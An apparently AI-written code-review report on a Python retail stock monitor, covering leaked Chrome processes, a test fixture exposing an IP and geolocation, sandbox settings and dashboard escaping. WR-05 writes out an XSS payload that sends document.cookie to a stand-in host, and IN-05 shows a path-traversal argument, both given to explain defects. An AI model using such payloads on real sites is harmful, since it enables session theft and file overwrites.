---
status: findings
phase: 02-five-retailers-green
reviewed: 2026-08-03T02:11:44Z
depth: standard
files_reviewed: 18
files_reviewed_list:
  - boty/browser.py
  - boty/cli.py
  - boty/fetch.py
  - boty/fixtures.py
  - boty/models.py
  - boty/parse.py
  - boty/retailers.py
  - boty/status.py
  - scripts/mutation_check.py
  - tests/conftest.py
  - tests/test_browser.py
  - tests/test_fetch.py
  - tests/test_models.py
  - tests/test_parse.py
  - tests/test_retailers.py
  - tests/test_status.py
  - config/products.yaml
  - Makefile
critical: 2
warning: 7
info: 6
findings:
  critical: 2
  warning: 7
  info: 6
  total: 15
---

# Phase 2: Code Review Report

**Reviewed:** 2026-08-03T02:11:44Z
**Depth:** standard
**Files Reviewed:** 18
**Status:** issues_found

## Summary

The verdict layer of this phase is in good shape and I want to be precise about
that, because most of the phase's risk was concentrated there:

- **`Rung` / `Result.degraded` — no defect found.** Every one of the 13 `Result(...)`
  construction sites in `boty/` passes `rung=` by keyword (`boty/retailers.py`
  111, 128, 142, 152, 162, 177, 179, 274, 282, 351, 359, 369, 379), so nothing
  can acquire the wrong rung positionally. `Result` is frozen and `degraded` is a
  derived property with no setter, so it cannot be cleared; M6 in the mutation
  gate proves the suite notices if the derivation is neutered (I ran it: 6/6
  caught, all anchors still resolve against current source, including M2's
  12-space anchor).
- **`BLOCK_PHRASES` — no defect found in either direction.** I ran all eight
  phrases against all eight shipped fixtures (2.6 MB of real retailer markup,
  including two 1 MB rendered Best Buy pages the phrase-replay test does *not*
  cover): zero false positives. The narrow-marker choice is vindicated by the
  data — `akamai` appears 15 times in Walmart's own CSP header and 33 times on
  Best Buy's search page, so the bare vendor name would have been catastrophic,
  and `datadome` is correctly absent per `docs/retailer-evidence.md:506`.
- **Best Buy's SKU-search redirect — the *observed* miss path is safe**, and the
  fixture confirms it: `tests/fixtures/bestbuy/unresolved-sku.html` contains
  zero `application/ld+json` blocks, so `ldjson_offers` returns `None` and the
  verdict is UNKNOWN. See WR-03 for what is not guarded.
- **Phase 1's fixed findings have not regressed.** CR-01 is pinned by M5 plus six
  tests, CR-02's guard now covers the browser seam and is asserted rather than
  assumed, CR-03's redaction is pinned on all four Best Buy API error paths,
  WR-03's UNKNOWN-for-unconfigured-retailer is pinned against a key
  (`costco`) chosen so an adapter cannot silently hollow the test out. IN-03 is
  fixed and, better, pinned against live Nintendo bytes.

What the phase did **not** get right is everything downstream of the verdict:
the browser transport's *process* behaviour, and what happens to the reading
after it leaves `Result`.

The headline finding is CR-01, and it is not theoretical — I measured it on the
running deployment. `boty.service` (PID 158172, 58 minutes uptime) is holding
**9 zombie `chrome` processes and 174 MB of leaked Chrome profile directories**,
growing by roughly one zombie and 170 MB per hour, forever, because nothing in
this codebase ever exits. `_render`'s docstring says "a monitor that stops
polling is as useless as one that lies"; on current trajectory this one fills its
tmpfs in days. `deferred-items.md` logged the visible symptom of the same root
cause ("Event loop is closed" noise) and classified it as cosmetic. It is not.

CR-02 is a data-exposure defect in a committed artifact: the rung-3 capture path
froze the capturing machine's public IP and city-level geolocation into
`tests/fixtures/bestbuy/unresolved-sku.html`, in a repo whose Phase 4 is
"Open Source Ready" — and `tests/test_fetch.py`'s own docstring says rung-3
bodies were kept out of fixtures for exactly this reason.

## Critical Issues

### CR-01: every browser render leaks a zombie Chrome and a Chrome profile directory, forever

**File:** `boty/browser.py:121-143` (`_render`), specifically the `finally` at 140-141
**Severity:** Critical — unbounded resource growth in the deployed daemon

**Issue:** `_render` calls `asyncio.run()` per render and cleans up with
nodriver's synchronous `browser.stop()`. Neither reaps the child nor removes the
throwaway profile:

- `Browser.stop()` (nodriver `core/browser.py:589-640`) schedules `aclose()` as a
  task and calls `self._process.terminate()`. `asyncio.run` then cancels that
  task and closes the loop immediately, so the SIGCHLD is never processed by the
  loop's child watcher. The Chrome process becomes a **zombie held by the boty
  process for as long as it lives** — which, for `boty watch`, is forever.
- The temp profile is created by nodriver's `Config` (`core/config.py:87`,
  `tempfile.mkdtemp(prefix="uc_")`) and removed *only* by
  `util.deconstruct_browser`, which runs from an `atexit` handler. A daemon that
  never exits never runs it. `boty/browser.py:127-128` asserts the opposite —
  "nodriver creates and removes a throwaway user-data dir per run" — and that
  comment is false in this usage.

**Measured on the live deployment (not inferred):**

```
$ ps -eo pid,ppid,etimes,stat,args | grep '[c]hrome.*defunct'
 158273  158172  3490 Z  [chrome] <defunct>      # 9 of these, one per ~5 min
 ...
$ sudo ls /proc/158172/root/tmp | grep -c uc_
11
$ sudo du -csh /proc/158172/root/tmp/uc_* | tail -1
174M    total
$ ps -o etimes= -p 158172
3500                                              # 58 minutes of uptime
```

Rate: ~12 renders/hour (one Best Buy control per 300 s cycle) → ~288
zombies/day and ~4 GB/day of profile directories under the unit's `PrivateTmp`.
The pid ceiling (`TasksMax=35561`) is months away, but the disk is days away, and
the failure mode when it lands is the worst kind for this project: every check
cycle raises, `watch_loop` logs and continues, and after ten consecutive
failures the unit exits and restarts — clearing the evidence and starting the
climb again.

**Fix:** reap the child and delete the profile inside `_run`'s `finally`, where
the loop is still alive:

```python
        finally:
            browser.stop()
            proc = getattr(browser, "_process", None)
            if proc is not None:
                # Reap it. Without this the loop closes before SIGCHLD is
                # handled and the child stays a zombie for the life of the
                # monitor — one per cycle, forever.
                with contextlib.suppress(BaseException):
                    await asyncio.shield(asyncio.wait_for(proc.wait(), 10))
            cfg = getattr(browser, "config", None)
            if cfg is not None and not cfg.uses_custom_data_dir:
                shutil.rmtree(cfg.user_data_dir, ignore_errors=True)
```

(`asyncio.shield` matters: on the `wait_for` timeout path this `finally` runs
under cancellation, and a bare `await` there re-raises immediately.) Add a test
in `tests/test_browser.py` against the fake nodriver asserting the profile dir
is gone and `proc.wait()` was awaited — the existing
`test_the_browser_is_stopped_even_when_the_page_explodes` only checks
`stop()` was called, which is exactly why this shipped.

---

### CR-02: a committed fixture publishes the capturing machine's public IP and geolocation

**File:** `tests/fixtures/bestbuy/unresolved-sku.html` (written by
`boty/fixtures.py:69-120`, `capture(..., browser=True)`); committed in `e5e4b90`
**Severity:** Critical — permanent data exposure in a repo slated for public release

**Issue:** Best Buy's rendered search page echoes the request headers into its
hydration payload. The frozen fixture therefore contains, verbatim:

- `"true-client-ip":"192.0.2.1"` and
  `"x-forwarded-for":"192.0.2.1, 192.0.2.1, 192.0.2.1"` — **8
  occurrences** of the capturing host's public IP;
- `"x-akamai-edgescape":"georegion=285,country_code=US,region_code=XX,city=REDACTED,dma=REDACTED,...,areacode=REDACTED,county=REDACTED,fips=REDACTED,lat=0.0000,long=0.0000"`
  — **3 occurrences** of city-level geolocation of that IP;
- the capture user-agent, including `HeadlessChrome/149.0...` and Akamai's own
  `"akamai-bot":"unknown bot (headlesschro_...)"` classification.

This directly contradicts the standard the phase set for itself:
`tests/test_fetch.py:23-26` says the Imperva rung-3 body was *deliberately not*
captured as a fixture because "the rung-3 body embeds the probing machine's
public IP in a query string". The same hazard on a different retailer went
unnoticed because nothing checks for it. It is also the same class of leak
`retailers._redact_host_paths` exists to prevent ("a stock monitor has no
business publishing somebody's home directory layout").

**Concrete failure scenario:** REQ-11 pushes this repo to GitHub and PyPI. The
IP, the ISP (`network_type=REDACTED`), and the town of the machine that runs the
monitor are then public, permanently, in git history — and the sdist ships the
fixture too.

**Fix:** three parts, in order:

1. Scrub the fixture now: replace `192.0.2.1` with `192.0.2.1`
   (RFC 5737 documentation range) and the edgescape blob with a neutral value,
   then re-run the suite — the assertions are about ld+json markup, so nothing
   depends on these bytes. Rewrite the blob out of history before Phase 4
   publishes (it is one commit, `e5e4b90`).
2. Make it mechanical, since a human reviewer already missed it once: add a test
   that scans `tests/fixtures/**` for a `true-client-ip`/`x-forwarded-for`
   header echo and for any public IPv4 literal, and fails.
3. Note the hazard in `boty/fixtures.py:capture`'s docstring next to the
   `browser=True` paragraph: a rendered capture snapshots the *request* as well
   as the response.

## Warnings

### WR-01: a Chrome spawned by a failing `nodriver.start()` is never stopped at all

**File:** `boty/browser.py:122-141`

**Issue:** `browser = await nodriver.start(...)` sits *outside* the `try`, so the
`finally` that stops the browser only covers the post-start path. nodriver's
`Browser.start()` (`core/browser.py:353-389`) spawns Chrome, then polls the
DevTools endpoint five times over ~2.75 s and raises
`Exception("Failed to connect to browser")` **without terminating the process it
just spawned**. The same hole opens if `wait_for`'s cancellation lands anywhere
inside `start()` (the retry loop, `attach()`, `update_targets()`).

Unlike CR-01's zombies these are *live* Chrome processes with a real RSS, and the
atexit handler that would clean them up never runs in `boty watch`.

`_render`'s docstring (lines 104-107) claims "the browser is stopped in a
`finally` on every path including cancellation". That is not true for the start
path, and no test covers it — `_fake_nodriver`'s `_start` cannot fail.

**Concrete failure scenario:** danserver runs several agents; a loaded box makes
Chrome miss the 2.75 s DevTools budget. `start()` raises, `_render` converts it
to `FetchError`, Best Buy reads UNKNOWN (correctly), and a full Chrome stays
resident. Next cycle, another one. Nothing reports it.

**Fix:**

```python
    async def _run() -> str:
        browser = None
        try:
            browser = await nodriver.start(...)
            tab = await browser.get(url)
            await asyncio.sleep(settle_seconds)
            return str(await tab.get_content())
        finally:
            if browser is not None:
                ...  # CR-01's teardown
```

and correct the docstring claim to match. A test with `_fake_nodriver(..., start_explodes=True)`
should assert no process is left behind.

---

### WR-02: the sandbox opt-out fires on `BOTY_BROWSER_NO_SANDBOX=0`, and is disabled silently under root

**File:** `boty/browser.py:113`

**Issue:** `sandbox = not os.environ.get(NO_SANDBOX_ENV)` treats *any* non-empty
value as "disable the sandbox", including `0`, `false`, `no` and `off` — the
four ways a person most naturally writes "I do not want this". The module's own
argument for the variable is that "a security downgrade that happens silently is
not one anybody reviewed", and this is precisely a silent downgrade: someone
editing `~/.config/boty/env` to turn the workaround *off* turns it on.

Second, narrower hole in the same claim: nodriver's `Config.__init__`
(`core/config.py:105-108`) auto-disables the sandbox when `is_root()`, logging at
INFO — below `boty`'s default WARNING level. Run boty as root (a container, or a
systemd unit without `User=`; the repo's own `docker-compose.yml` runs its
browser as root) and retailer JavaScript executes unsandboxed as root, with no
warning and `boty/browser.py`'s log line never firing.

**Fix:**

```python
_TRUTHY = {"1", "true", "yes", "on"}
raw = os.environ.get(NO_SANDBOX_ENV, "").strip().lower()
if raw and raw not in _TRUTHY and raw not in {"0", "false", "no", "off"}:
    log.warning("%s=%r is not a recognised boolean — treating as OFF", NO_SANDBOX_ENV, raw)
sandbox = raw not in _TRUTHY
if os.geteuid() == 0:
    log.warning("running as root: Chrome disables its sandbox automatically")
```

Extend `test_the_chrome_sandbox_is_on_unless_explicitly_disabled` to
parametrise over `"0"`, `"false"`, `""` and `"1"`.

---

### WR-03: nothing binds Best Buy's rendered page back to the SKU that was requested

**File:** `boty/retailers.py:244-296` (`check_bestbuy_browser`), via
`_verdict_from_html` at 290-296

**Issue:** `bestbuy_product_url` feeds a bare SKU to Best Buy's search and trusts
the redirect. The verdict is then whatever `_pick` finds in the page's ld+json,
with **no check that the product it found is the product that was asked for** —
even though the markup carries the identity right there
(`"sku": "6216393"`, and a canonical URL ending `/sku/6216393`).

Today this is safe, and I verified why rather than taking the docstring's word:
`tests/fixtures/bestbuy/unresolved-sku.html` has zero `application/ld+json`
blocks, so a search-results page yields `None` and the verdict is UNKNOWN. But
that safety is entirely a property of *Best Buy's search-results template*,
which is a third party's SEO decision, not a property of this code. Adding
`Product` markup to result cards is one of the most common SEO changes a
retailer makes.

**Concrete failure scenario:** Best Buy adds `Product`+`Offer` markup to search
result cards (or a SKU query resolves to a near-match product). `_pick` then
returns the *cheapest available first-party offer on the page* — a $9.99 HDMI
cable in the same results — and the monitor reports it as the stock state of the
watched SKU, with the watch's own name attached. If it were a product watch
under a ceiling, it alerts. Nothing catches this: Best Buy's only configured
watch is a control, the control's own SKU still resolves, so health stays green
and the dashboard stays green. That is the exact "confident, wrong, plausible
reading" this project ranks as its worst outcome.

**Fix:** pass the expected identity into the Best Buy path and refuse to answer
without it:

```python
def _sku_matches(html: str, sku: str) -> bool:
    """True if the rendered page really is this SKU's product page."""
    return f'"sku":"{sku}"' in html.replace(" ", "") or f"/sku/{sku}" in html

...
    if not _sku_matches(page.text, watch.target):
        return Result(watch, Availability.UNKNOWN,
                      detail=f"sku {watch.target} did not resolve to a product page",
                      url=product_url, rung=Rung.BROWSER)
```

Add a regression test that synthesises a search page carrying a *different*
SKU's `Product` markup and asserts UNKNOWN — the one case the two real fixtures
cannot represent.

---

### WR-04: the status page never shows `degraded`, so a browser reading looks first-class where it is actually read

**File:** `served/boty/index.html:88-96`; contract asserted in `boty/status.py:44-54`

**Issue:** `status.write` now publishes `rung` and `degraded`, and its comment
states these keys are "a contract with the dashboard... the page renders it
verbatim". The page does not render either one: line 92 renders a `control` tag
and line 93 renders `retailer · detail`, and `degraded` appears nowhere in
`served/boty/index.html`. `boty check`'s CLI table was updated
(`cli._report:68`), but the CLI is not the surface that gets looked at — the
phone-readable status page behind `/tools/boty` is.

**Concrete failure scenario:** Best Buy's control row renders as a green ● at
$59.99, visually identical to GameStop's rung-1 row. The phase's own contract
("anything reached via a browser is flagged DEGRADED in both the support matrix
and `boty check` output", 02-CONTEXT.md) is met in letter and defeated in the
place a human actually reads.

**Fix:** in `served/boty/index.html:92`, alongside the control tag:

```js
${w.control ? '<span class="tag">control</span>' : ''}${w.degraded ? '<span class="tag degraded">degraded</span>' : ''}
```

plus a `.tag.degraded` rule. `tests/test_status.py` already pins the payload
key, so only the renderer is missing.

---

### WR-05: retailer-controlled strings are interpolated into the dashboard's `innerHTML`

**File:** `served/boty/index.html:88-96` (sink), `boty/retailers.py:166` (source)

**Issue:** `d.watches.map(...)` builds HTML by string interpolation and assigns
it to `innerHTML`. `w.detail` is
`f"{source}: {offer.raw_availability} from {seller}"` — both halves come
straight from the retailer's JSON-LD, unescaped, via `status.json`. `w.name` and
`w.url` are operator-controlled, but `detail` is not.

With `settings.first_party_only: true` the seller string is bounded by the
allow-list, which mitigates it by accident; with `first_party_only: false` — a
supported, documented setting that `tests/test_retailers.py` exercises — `_pick`
accepts any offer and an arbitrary **marketplace seller's display name** lands
in `innerHTML`. `raw_availability` is unbounded on both settings.

**Concrete failure scenario:** a Walmart marketplace seller names their store
`<img src=x onerror="fetch('http://x/'+document.cookie)">`; boty stores it in
`status.json`; the dashboard executes it. Because the page is proxied under
Mission Control's `/tools/boty`, the injected script runs on Mission Control's
origin, not an isolated one.

**Fix:** escape at the sink, once:

```js
const esc = s => String(s ?? '').replace(/[&<>"']/g, c =>
  ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
```

and wrap `w.name`, `w.detail`, `w.retailer`, `w.url` (and `r.retailer`/`r.reason`
in the banner at line 82) in it.

---

### WR-06: a fresh clone that follows the README fails `make verify`, and the gate blames the detector

**File:** `config/products.yaml:91-94` + `pyproject.toml` extras + `Makefile:63-64`

**Issue:** the shipped config contains a mandatory Best Buy **control**, whose
only credential-free path is rung 3. Rung 3 needs the `browser` extra *and* a
Chrome binary, and neither is in `dev`. The README's Install section is
`pip install -e .`; the browser rung is introduced afterwards as "only if you
want Best Buy". But Best Buy is not opt-in — it is in the default config, and
`control_check` fails the whole gate on it.

**Concrete failure scenario:** a contributor clones, runs
`pip install -e '.[dev]'`, runs `make verify` on a networked machine, and gets:

```
control check: FAIL — 1/4 control(s) not reading IN_STOCK
    bestbuy/CONTROL — Pokémon Let's Go, Pikachu!: unknown — fetch failed: the browser transport needs the optional extra...

  This is a statement about the DETECTOR, not about the market.
  ...the extractor has stopped matching...
```

The diagnosis is wrong — the extractor is fine, the host lacks an optional
dependency — and this is the same misattribution defect the phase fixed twice
for Imperva and Akamai walls. It also contradicts the acceptance criterion
"`make verify` exits 0 on a healthy tree" and the "works from a fresh clone" NFR.

**Fix:** either add `browser` to the `dev` extra (`dev = [..., "nodriver>=0.38"]`)
so the gate's dependencies come with the gate, or teach
`scripts/control_check.py` to distinguish a *transport unavailable on this host*
from a *detector failure*:

```python
_HOST_GAPS = ("needs the optional extra", "no Chrome/Chromium binary found")
...
if any(g in r.detail for g in _HOST_GAPS):
    print("  this control could not run on THIS HOST (missing browser rung), "
          "which says nothing about the detector — see README 'The browser rung'")
```

Whichever is chosen, say it in the README's verify section.

---

### WR-07: the Akamai block markers are pinned only against a hand-written reconstruction

**File:** `boty/fetch.py:66-67`, `tests/test_fetch.py:69-78` and `:140-156`,
`docs/retailer-evidence.md:620-641`

**Issue:** `sec-if-cpt-container` and `scf-akamai-protected-by` were added from a
Kohl's probe, but the probe's raw output was not saved and the evidence doc
records no URL, no byte count and no excerpt for it — the only entry in a 641-line
document that meticulous everywhere else (the Imperva entries quote 6,183 B and
1,085 B). `AKAMAI_CHALLENGE` in the test is explicitly a reconstructed "verbatim
shape", so `test_an_akamai_challenge_at_http_200_is_blocked_not_a_page` asserts
our phrase against our own transcription of it: it passes identically whether the
marker is right or a typo.

**Concrete failure scenario:** the real container id is (say) `sec-cpt-if` rather
than `sec-if-cpt-container`. The phrase never fires in production. Phase 3 walks
the ladder at Target — Akamai-fronted, per the comment's own reasoning — the wall
returns HTTP 200, and the refusal surfaces as "no structured stock data found
(page shape changed?)", sending someone to debug a working extractor. That is
exactly the outcome the phrase was added to prevent, and the green test says
nothing.

**Fix:** re-probe one Akamai-fronted page (Kohl's) and paste the matched
substring with ~80 bytes of surrounding markup plus the response size into
`docs/retailer-evidence.md`, the way the Imperva case is recorded. If a marker
does not appear verbatim, correct it. Cost: one request; the alternative is a
block phrase that can only ever fail silently.

## Info

### IN-01: `mutation_check.py`'s docstring still describes three mutations

**File:** `scripts/mutation_check.py:7`, `:10`, `:33`, `:213`

There are six. Line 7 "corrupts three specific things", line 10 "The three
mutations are not arbitrary", line 33 "would score a perfect 3/3", and the
`HarnessError` message at line 213 "so all three would 'survive'" — the last is
user-facing text printed at the moment somebody is debugging the harness.
Already logged in `deferred-items.md`; the note itself is now partly stale (the
"THREE THINGS" header it mentions has since become "FOUR THINGS", line 23).
**Fix:** `s/three/six/` and make line 213 say "every mutation".

### IN-02: duplicated rationale comment on `SANDBOX_CONTENTS`

**File:** `scripts/mutation_check.py:55-71`

Two comment blocks argue the same point: lines 60-65 ("`scripts` and `Makefile`
are here because...") end with the faithful-copy argument, and line 66 restarts
it with "Everything the suite reads. The sandbox has to be a faithful copy or the
run proves nothing". Looks like two edits landed without merging.
**Fix:** keep one paragraph and fold `config`'s justification into it.

### IN-03: a Best Buy SKU that stops resolving is reported as "page shape changed?"

**File:** `boty/retailers.py:111-117` reached from `check_bestbuy_browser`

For the Best Buy rung the honest diagnosis of "no structured stock data" is
"this SKU did not resolve to a product page" — the search-miss path is a
*known, evidenced* branch (`docs/retailer-evidence.md:166-171`), not an unknown
one. Pointing the reader at our own parser for it is the same misattribution the
phase fixed for Imperva and Akamai walls, just one layer up. Naturally solved by
WR-03's identity check, which supplies the right wording.

### IN-04: `control_check --offline` help text contradicts its exit code

**File:** `scripts/control_check.py:270-273` (adjacent to the reviewed `Makefile`)

The help says "skip the live check entirely and **exit 0**"; it returns
`SKIPPED` (3), which is the whole point of the constant and of `Makefile:91-96`.
A reader trusting `--help` would think `verify-offline` cannot distinguish the
skip. **Fix:** "...and exit 3 (SKIPPED — not a pass)".

### IN-05: fixture path components are still unsanitised (Phase 1 IN-06, still open)

**File:** `boty/fixtures.py:59-66`, reached from `cli._capture_fixture`

`html_path(retailer, name)` joins CLI-supplied strings straight onto
`FIXTURE_ROOT`, so `boty capture-fixture ../../etc passwd <url>` writes outside
the fixture tree. Local-only and unchanged this phase, but this phase added a
second caller (`--browser`), so it is worth closing rather than deferring again.
**Fix:** reject any component containing `/`, `\` or `..` in `capture()`.

### IN-06: the repo still ships the evaluation artifacts of the tool it rejected

**File:** `docker-compose.yml`, `datastore/` (root-owned)

changedetection.io + sockpuppetbrowser compose services and a root-owned
`datastore/` sit at the repo root. `PROJECT.md` records that tool as ruled out
with evidence, so a contributor arriving at Phase 4's public repo finds a
compose file that has nothing to do with bot-y and cannot be run without sudo.
**Fix:** delete both, or move the compose file under `docs/` with a header saying
it is a record of a rejected evaluation.

---

_Reviewed: 2026-08-03T02:11:44Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
